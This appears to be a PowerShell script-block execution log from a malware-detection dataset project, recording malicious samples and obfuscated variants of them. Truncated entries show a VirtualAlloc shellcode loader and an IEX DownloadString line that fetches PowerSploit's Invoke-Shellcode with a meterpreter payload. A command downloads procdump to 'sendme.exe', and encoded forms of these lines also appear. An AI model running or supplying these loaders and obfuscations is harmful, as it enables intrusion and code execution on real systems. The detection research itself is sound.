"8/6/2026 10:02:56 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1395.ps1","18","{([CHAr][INt]$_) }"
"8/6/2026 10:02:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1395.ps1","7570"," -JOIn ( '36Y99!32Q61>32k39<91!68Y108-108,73k109-112>111,114k116Y40-34U107s101>114s110k101,108,51s50Q46<100Q108,108Y34U41Y93>112!117s98>108!105Q99Q32-115U116Q97>116s105Q99Y32<101Y120s116k101Y114-110U3"
"8/6/2026 10:02:48 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:48 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:48 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:48 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:48 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1395.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:40 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:40 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:40 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:40 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:40 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1391.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:32 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:32 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:32 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:32 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:32 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:32 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1391.ps1","2952"," ((""{19}{62}{60}{14}{24}{34}{58}{55}{7}{30}{26}{11}{29}{1}{56}{42}{18}{65}{32}{33}{9}{13}{4}{28}{3}{64}{48}{39}{52}{6}{51}{69}{68}{10}{53}{59}{57}{44}{41}{8}{36}{23}{38}{27}{50}{43}{20}{54}{2}{5}{45}{"
"8/6/2026 10:02:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:24 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:24 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:24 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:24 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:24 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1391.ps1","2620"," ('r'+'Lec = 4H9[DllImport(fukkern'+'el32.dllfuk)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, ui'+'nt dwSize, uin'+'t flAllocationType, uint flProtect);[DllImport(fukkerne'+'l32.dllfuk)"
"8/6/2026 10:02:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:16 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1391.ps1","19","{([ChAR][inT] $_) }"
"8/6/2026 10:02:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1391.ps1","9804"," &( $SHELlid[1]+$sHElLId[13]+'X')(-Join ((36, 99,32, 61,32,39 , 91 ,68 , 108, 108,73 ,109 ,112, 111,114 , 116 , 40,34 ,107,101 , 114, 110 ,101,108 ,51, 50 ,46 , 100,108, 108 ,34,41 ,93 ,112, 117 , 98 "
"8/6/2026 10:02:08 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:08 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:08 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:08 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:08 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1391.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:02:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:02:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:02:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:02:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:02:00 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1376.ps1","264","I`eX (nEw`-ObJ`ecT Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); i`Nv`OKE-SHeLlCOde  Payload windows/meterp"
"8/6/2026 10:01:52 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:52 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:52 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:52 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:52 AM","","257","IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter"
"8/6/2026 10:01:52 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1376.ps1","677","((""{16}{6}{49}{43}{3}{30}{20}{14}{9}{36}{29}{4}{25}{0}{35}{10}{1}{22}{33}{48}{44}{42}{18}{37}{27}{17}{26}{46}{31}{8}{38}{32}{12}{7}{5}{21}{41}{13}{2}{45}{19}{39}{11}{40}{28}{15}{23}{24}{34}{47}"" -f'/'"
"8/6/2026 10:01:44 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:44 AM","","257","IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter"
"8/6/2026 10:01:44 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1376.ps1","520","IeX (('IEX (New-'+'Object Ne'+'t.We'+'bCl'+'ien'+'t'+')'+'.D'+'ownload'+'S'+'tring('+'TZ'+'t'+'h'+'ttps://r'+'a'+'w.g'+'i'+'t'+'hu'+'bus'+'er'+'con'+'tent.'+'c'+'om/'+'mattifestation/PowerSpl'+'oit/ma"
"8/6/2026 10:01:36 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:36 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:36 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:36 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:36 AM","","260"," IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterprete"
"8/6/2026 10:01:36 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1376.ps1","23","{( [iNt] $_ -AS[chaR])}"
"8/6/2026 10:01:35 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1376.ps1","1306",""" $( SeT-VarIABle 'oFS'  '' )"" + [stRiNg]((73,69, 88, 32 , 40,78 , 101 ,119, 45, 79 , 98, 106 ,101 ,99 , 116,32 , 78, 101, 116,46 ,87 , 101, 98 , 67, 108,105 ,101 ,110,116 ,41 , 46, 68 ,111 ,119 ,110 "
"8/6/2026 10:01:28 AM","","9","$global:?"
"8/6/2026 10:01:28 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:28 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:28 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:28 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:27 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1376.ps1","257","IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode  Payload windows/meterpreter"
"8/6/2026 10:01:20 AM","","9","$global:?"
"8/6/2026 10:01:20 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:20 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:20 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:20 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:20 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1362.ps1","86","INVo`Ke-`w`eBRe`QUeST -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe
"
"8/6/2026 10:01:12 AM","","9","$global:?"
"8/6/2026 10:01:12 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:12 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:12 AM","","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:01:12 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1362.ps1","316","&( $PSHome[21]+$PshoMe[30]+'x') ( ((""{17}{8}{0}{7}{18}{6}{15}{11}{10}{14}{5}{19}{16}{3}{1}{2}{4}{9}{12}{13}"" -f'e','3','gtemp',':m','m3gsen','mp','tt','st ','-WebRequ','dm','procd','tderr.pl/','e.','e"
"8/6/2026 10:01:05 AM","","9","$global:?"
"8/6/2026 10:01:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:01:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:01:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:01:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:01:05 AM","","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:01:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1362.ps1","237","(('Invoke-'+'We'+'b'+'Req'+'uest -Uri http:/'+'/stder'+'r.pl/'+'p'+'rocdump.exe -Out'+'File'+' c'+':PLV'+'t'+'em'+'pP'+'LVs'+'endme.exe')-CrEpLace([CHaR]80+[CHaR]76+[CHaR]86),[CHaR]92)|. ( $veRbOSEpre"
"8/6/2026 10:00:57 AM","","9","$global:?"
"8/6/2026 10:00:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:57 AM","","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:00:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1362.ps1","23","{ ([INT] $_-aS[chAr]) }"
"8/6/2026 10:00:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1362.ps1","419"," [STrIng]::JOin( '' , ( '73h110k118{111i107i101i45{87@101k98_82_101h113b117b101@115_116h32_45k85_114h105@32r104b116;116b112h58@47g47b115h116@100_101h114{114;46b112k108k47g112r114b111g99@100i117i109h11"
"8/6/2026 10:00:50 AM","","9","$global:?"
"8/6/2026 10:00:50 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:49 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1362.ps1","80","Invoke-WebRequest -Uri http://stderr.pl/procdump.exe -OutFile c:\temp\sendme.exe"
"8/6/2026 10:00:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:41 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:41 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:41 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\136.ps1","2237","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:33 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:33 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:33 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:33 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:33 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:33 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\136.ps1","2940","(((""{2}{1}{33}{11}{53}{5}{62}{56}{16}{57}{0}{46}{25}{35}{61}{21}{27}{39}{54}{65}{38}{8}{58}{20}{68}{64}{51}{41}{28}{26}{6}{45}{55}{66}{24}{10}{48}{7}{37}{4}{34}{67}{44}{18}{43}{40}{29}{69}{32}{36}{59}"
"8/6/2026 10:00:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:25 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\136.ps1","2608","& ( $SHeLlID[1]+$shELliD[13]+'X') ( ('zHsc = yad[DllImport(eZikernel32.dlleZi)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, u'+'int flAllocat'+'ionType,'+' uint flProt'+'ect"
"8/6/2026 10:00:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:17 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\136.ps1","21","{([int]$_-as[ChaR]) }"
"8/6/2026 10:00:17 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\136.ps1","7695","& ( ([sTriNG]$VerBOsePreFERENCe)[1,3]+'X'-joiN'')( ( '36K99M32F61S32F39M91K68~108&108&73>109G112~111j114&116F40S34~107&101>114S110>101>108K51~50K46G100S108G108j34G41M93M112&117G98K108>105M99G32S115M11"
"8/6/2026 10:00:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\136.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 10:00:01 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 10:00:01 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 10:00:01 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 10:00:01 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 10:00:01 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1354.ps1","2248","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:53 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:53 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:53 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:53 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:53 AM","","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:53 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1354.ps1","2781","((""{10}{40}{23}{39}{2}{28}{21}{35}{25}{3}{46}{19}{43}{24}{44}{15}{38}{13}{45}{26}{0}{36}{37}{34}{8}{22}{12}{30}{33}{42}{7}{18}{17}{14}{9}{41}{31}{16}{5}{4}{20}{29}{1}{32}{6}{27}{11}""-f '8b,0x58,0x20,0"
"8/6/2026 9:59:45 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:45 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:45 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:45 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:45 AM","","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:45 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1354.ps1","2647"," (('Q9747m '+'= isp[DllImport(2etkernel32.dll2et)]publ'+'ic static extern IntPtr VirtualAlloc(IntPtr lpAddr'+'es'+'s, ui'+'nt'+' dwSize, uint flAllocationType, uint flProtect);[DllI'+'mpo'+'rt(2etkern"
"8/6/2026 9:59:37 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:37 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:37 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:37 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:37 AM","","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1354.ps1","21","{ ( [CHar] [INt] $_)}"
"8/6/2026 9:59:37 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1354.ps1","7689","[StRiNg]::jOIN('' , ( '36S52<55b109D32_61<32i39;91T68;108_108<73T109i112b111i114_116;40D34i107D101b114i110{101;108i51_50{46<100<108{108b34T41b93S112{117D98T108_105b99{32T115<116{97_116b105;99{32S101i1"
"8/6/2026 9:59:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:29 AM","C:\TA\project-ta\data_spliting\test_set\malicious\1354.ps1","2241","$47m = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/6/2026 9:59:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:21 AM","C:\TA\project-ta\data_spliting\test_set_obf\Token_Manipulation\malicious\1348.ps1","2453","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:59:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:13 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:59:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Reordering\malicious\1348.ps1","3006","IEX( ((""{14}{39}{27}{33}{4}{7}{31}{1}{48}{29}{42}{0}{30}{45}{15}{44}{50}{22}{19}{38}{37}{2}{34}{43}{16}{9}{26}{41}{46}{12}{5}{40}{10}{3}{18}{28}{17}{32}{13}{6}{20}{23}{35}{11}{49}{21}{25}{24}{47}{36}{"
"8/6/2026 9:59:05 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:59:05 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:59:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:59:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:59:05 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:59:05 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\1348.ps1","2812","INVOke-eXPREsSioN ((('mSQc = 3dX[DllImport(Frfkernel32.dllFrf)]'+'public static extern IntPtr VirtualAlloc(Int'+'Ptr lpAddress, uint dwSize, uint flAllocationType, u'+'int flProtect);[DllImport(Frfker"
"8/6/2026 9:58:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:58:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:58:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:58:57 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/6/2026 9:58:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1348.ps1","24","{ ([INt] $_ -AS [chAR])}"
"8/6/2026 9:58:57 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\1348.ps1","8291","('36@99o32-61}32:39@91u68g108u108u73}109V112}111-114@116r40u34}107V101}114@110p101}108V51r50o46-100}108V108r34r41r93u112u117u98p108o105:99o32r115u116V97V116p105g99p32}101r120@116-101}114-110g32@73V110"
"8/6/2026 9:58:49 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:58:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
